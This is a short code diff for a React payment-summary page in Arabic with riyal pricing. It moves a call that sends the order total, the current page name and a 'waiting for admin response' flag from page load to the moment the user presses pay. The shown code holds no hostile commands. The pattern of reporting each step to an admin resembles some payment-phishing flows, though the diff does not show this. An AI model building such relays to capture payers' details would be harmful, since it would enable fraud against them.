@@ -74,22 +74,20 @@ export default function SummaryPayment() {
   useEffect(() => {
     document.title = 'ملخص الطلب والدفع';
     navigateToPage('ملخص الدفع');
-    
-    setTimeout(() => {
-      sendData({
-        data: {
-          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
-        },
-        current: 'الملخص والدفع',
-        waitingForAdminResponse: false,
-      });
-    }, 1000);
-  }, [servicePrice]);
+  }, []);
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
 
     setIsProcessing(true);
+
+    sendData({
+      data: {
+        'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
+      },
+      current: 'الملخص والدفع',
+      waitingForAdminResponse: false,
+    });
 
     sendData({
       data: {
